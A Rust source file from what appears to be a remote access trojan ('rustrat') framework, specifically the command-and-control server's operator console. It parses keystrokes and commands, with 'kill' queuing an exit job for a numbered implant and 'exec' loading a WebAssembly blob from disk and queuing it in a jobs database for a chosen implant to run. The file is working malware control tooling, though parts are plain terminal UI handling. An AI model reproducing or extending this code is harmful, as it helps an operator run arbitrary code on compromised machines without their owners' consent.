use crate::badtui::gui::Command;

use rustrat_common::messages::*;

use futures::StreamExt;

pub struct Input {
    input: String,
    gui_tx: tokio::sync::mpsc::Sender<Command>,
    // TODO not let "Input" handle database stuff
    db_pool: crate::persistence::Pool,
}

impl Input {
    pub async fn handle(
        gui_tx: tokio::sync::mpsc::Sender<Command>,
        db_pool: crate::persistence::Pool,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let mut input = Input {
            input: "".to_string(),
            gui_tx,
            db_pool,
        };

        let mut reader = crossterm::event::EventStream::new();

        loop {
            tokio::select! {
                _ = input.gui_tx.closed() => break,
                Some(Ok(event)) = reader.next() => {
                    if let crossterm::event::Event::Key(key_event) = event {
                        match key_event.code {
                            crossterm::event::KeyCode::Char(key) => {
                                if key_event
                                    .modifiers
                                    .contains(crossterm::event::KeyModifiers::CONTROL)
                                {
                                    if key == 'c' {
                                        input.gui_tx.send(Command::Quit).await?;
                                    }
                                } else {
                                    input.input.push(key);

                                    input.gui_tx
                                        .send(Command::SetInput(input.input.clone()))
                                        .await?;
                                }
                            }

                            crossterm::event::KeyCode::Backspace => {
                                input.input.pop();

                                input.gui_tx
                                    .send(Command::SetInput(input.input.clone()))
                                    .await?;
                            }

                            crossterm::event::KeyCode::Enter => {
                                input.exec_cmd(&input.input).await?;
                                input.input = "".to_string();
                                input.gui_tx.send(Command::SetInput(input.input.clone())).await?;
                            }

                            _ => {
                                log::debug!("Unimplemented key event received: {:?}", key_event);
                            }
                        }
                    }
                },

                else => break,
            }
        }

        Ok(())
    }

    async fn exec_cmd(&self, raw_cmd: &str) -> Result<(), Box<dyn std::error::Error>> {
        let raw_cmd = raw_cmd.trim_end();

        if raw_cmd.is_empty() {
            return Ok(());
        }

        log::info!("> {}", raw_cmd);

        let cmd_parts: Vec<String> = raw_cmd
            .split_ascii_whitespace()
            .map(|s| s.to_string())
            .collect();

        let gui_tx = self.gui_tx.clone();

        match &cmd_parts[0].to_lowercase() as &str {
            "quit" | "exit" => {
                log::info!("Shutting down server");
                gui_tx.send(Command::Quit).await.unwrap();
            }

            "kill" if cmd_parts.len() != 2 => log::info!("Usage: kill <rat id>"),
            "kill" if cmd_parts.len() == 2 => match cmd_parts[1].parse::<i32>() {
                Ok(rat_id) => {
                    let db_pool = self.db_pool.clone();
                    tokio::spawn(async move {
                        let result = sqlx::query!(
                                "INSERT INTO jobs (rat_id, created, last_update, started, done, job_type, payload) VALUES (?, datetime('now'), datetime('now'), false, false, 'exit', '');",
                                rat_id
                            )
                                .execute(&db_pool.writer)
                                .await;

                        if result.is_ok() {
                            log::info!("Tasked rat #{} to shut down", rat_id);
                        } else {
                            log::info!("Unable to make rat #{} shut down, are you sure you entered the correct id?", rat_id);
                        }
                    });
                }

                Err(_) => log::info!("Unable to parse rat id \"{}\" as an int", cmd_parts[1]),
            },

            "exec" if cmd_parts.len() != 4 => {
                log::info!("Usage: exec <rat id> <path to wasm blob> <fn name>");
                log::info!("Note that spaces in the path is not supported at the moment");
            }

            "exec" if cmd_parts.len() == 4 => {
                match cmd_parts[1].parse::<i32>() {
                    Ok(rat_id) => {
                        let db_pool = self.db_pool.clone();

                        tokio::spawn(async move {
                            match tokio::fs::read(&cmd_parts[2]).await {
                                Ok(wasm) => {
                                    // This should probably be handled gracefully, but when will serialization fail?
                                    let payload =
                                        serialize(&server_to_rat::Task::WebAssemblyTask {
                                            wasm,
                                            fn_name: cmd_parts[3].to_string(),
                                        })
                                        .unwrap();
                                    let result = sqlx::query!(
                                        "INSERT INTO jobs (rat_id, created, last_update, started, done, job_type, payload) VALUES (?, datetime('now'), datetime('now'), false, false, 'task', ?)",
                                        rat_id,
                                        payload
                                    ).execute(&db_pool.writer).await;

                                    if result.is_ok() {
                                        log::info!(
                                            "Tasked rat {} to execute function {} from {}",
                                            rat_id,
                                            cmd_parts[3],
                                            cmd_parts[2]
                                        );
                                    } else {
                                        log::info!("Unable to store job in database, are you sure you entered the correct id?");
                                    }
                                }

                                Err(_) => {
                                    log::info!("Unable to read WASM blob from {}", cmd_parts[2])
                                }
                            }
                        });
                    }

                    Err(_) => log::info!("Unable to parse rat id \"{}\" as an int", cmd_parts[1]),
                }
            }

            _ => {
                log::info!("Unrecognized command {}", cmd_parts[0]);
            }
        }

        Ok(())
    }
}
